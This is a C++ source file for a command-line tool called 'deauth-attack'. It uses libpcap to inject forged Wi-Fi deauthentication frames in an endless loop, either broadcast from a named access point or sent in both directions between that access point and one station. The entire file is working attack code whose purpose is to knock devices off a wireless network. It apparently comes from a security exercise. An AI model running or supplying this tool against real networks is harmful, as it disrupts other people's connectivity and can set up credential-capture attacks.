#include <cstdio>
#include <iostream>
#include <unistd.h>
#include <pcap.h>
#include <netinet/in.h>
#include "deauth_hd.h"

using namespace std;

void usage() {
        cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>]\n";
        cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}


int main(int argc, char* argv[]) {
    	if (argc != 3 && argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    dp packet, packet2; // packet2 : for unicast
    packet.init();

    if(argc == 3) {
        packet.setPacket(Mac::broadcastMac(), Mac(argv[2]), Mac(argv[2]));

        while(true) {
            if(pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
                fprintf(stderr,  "pcap packet send fail %s", pcap_geterr(handle));
                return -1;
            }
            sleep(1); // delay
        }
    } 
    else if(argc == 4) {
        packet2.init();
        
        packet.setPacket(Mac(argv[2]), Mac(argv[3]), Mac(argv[3]));
        packet2.setPacket(Mac(argv[3]), Mac(argv[2]), Mac(argv[2]));

        while(true) {
            if(pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
                fprintf(stderr,  "pcap packet send fail %s", pcap_geterr(handle));
                return -1;
            }
            if(pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(packet2)) != 0) {
                fprintf(stderr,  "pcap packet send fail %s", pcap_geterr(handle));
                return -1;
            }
            sleep(1); // delay
        }
    }
    pcap_close(handle);
}